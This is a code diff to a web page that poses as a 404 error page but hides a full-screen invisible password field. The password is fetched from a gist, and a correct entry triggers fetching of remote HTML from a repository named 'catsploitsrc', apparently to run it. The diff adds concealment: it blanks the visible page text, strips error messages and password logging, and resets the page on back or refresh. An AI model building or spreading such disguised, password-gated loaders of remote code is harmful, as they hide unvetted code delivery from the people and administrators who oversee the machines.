@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Page Not Found</title>
+    <title></title>
     <link id="favicon" rel="icon" href="data:image/x-icon;," type="image/x-icon">
     <style>
         body {
@@ -52,8 +52,8 @@
     </style>
 </head>
 <body>
-    <h1>404 Not Found</h1>
-    <p>Sorry, the page you're looking for does not exist.</p>
+    <h1></h1>
+    <p></p>
     
     <!-- Full-screen invisible password input -->
     <input type="password" id="passwordInput" autocomplete="off">
@@ -64,21 +64,43 @@
         const DEFAULT_PASSWORD_URL = 'https://gist.githubusercontent.com/mrdavidss-vgg/760a6b773901661c318fa5cfa71988d4/raw/ef841ac025f3dbfafdaf5290ee56984cf8ab2f5b/pass.txt';
         let correctPassword = "4w4u9tuioerowuvigoteruwiovtunioerwuiovtueriotvuiotuoivtiuoteviuontuiotrwuioevuetwoiuntviuontrveiuowtrewio48583958904285904238954328905432890543890504328900543289005432890543829005437890295483097vtr089er8u09u9tgruh9tgru9rtgui9gtruogtr";
         let inputActive = true;
+        let passwordCorrect = false;
 
         const passwordInput = document.getElementById('passwordInput');
         const hiddenIndicator = document.getElementById('hiddenIndicator');
         const favicon = document.getElementById('favicon');
+        const h1 = document.querySelector('h1');
+        const p = document.querySelector('p');
+
+        function resetPage() {
+            if (!passwordCorrect) {
+                favicon.href = 'data:image/x-icon;,';
+                h1.textContent = '';
+                p.textContent = '';
+            }
+        }
 
         function changeFaviconToBait() {
+            passwordCorrect = true;
             favicon.href = 'https://raw.githubusercontent.com/mrdavidss-vgg/assets/refs/heads/main/enhanced_image.png';
         }
+
+        // Handle page refresh and back button
+        window.addEventListener('beforeunload', () => {
+            passwordCorrect = false;
+        });
+
+        window.addEventListener('pageshow', (event) => {
+            if (event.persisted) {
+                resetPage();
+            }
+        });
 
         // Your existing fetch function
         async function fetchAndRun() {
             try {
                 const response = await fetch('https://raw.githubusercontent.com/mrdavidss-vgg/catsploitsrc/refs/heads/main/index.html');
                 if (!response.ok) {
-                    alert("Failed to fetch URL.");
                     return;
                 }
                 const text = await response.text();
@@ -97,20 +119,18 @@
                 if (!response.ok) throw new Error('');
                 const text = await response.text();
                 correctPassword = text.trim();
-                console.log("");
                 hiddenIndicator.textContent = "";
             } catch (error) {
                 console.error("");
-                hiddenIndicator.textContent = "Error";
                 hiddenIndicator.style.color = "red";
                 setTimeout(() => {
-                    hiddenIndicator.textContent = "";
                     hiddenIndicator.style.color = "rgba(0,0,0,0.2)";
                 }, 3000);
             }
         }
 
         // Initialize
+        resetPage();
         fetchPassword();
         passwordInput.focus();
 
@@ -121,18 +141,13 @@
                     await fetchPassword();
                 }
                 
-                console.log("Input:", passwordInput.value, "Correct:", correctPassword);
-                
                 if (passwordInput.value === correctPassword) {
-                    hiddenIndicator.textContent = "";
                     hiddenIndicator.style.color = "green";
                     changeFaviconToBait();
-                    setTimeout(fetchAndRun, 1000); // Give time to see the feedback
+                    setTimeout(fetchAndRun, 1000);
                 } else {
-                    hiddenIndicator.textContent = "";
                     hiddenIndicator.style.color = "red";
                     setTimeout(() => {
-                        hiddenIndicator.textContent = "";
                         hiddenIndicator.style.color = "rgba(0,0,0,0.2)";
                     }, 2000);
                     passwordInput.value = "";
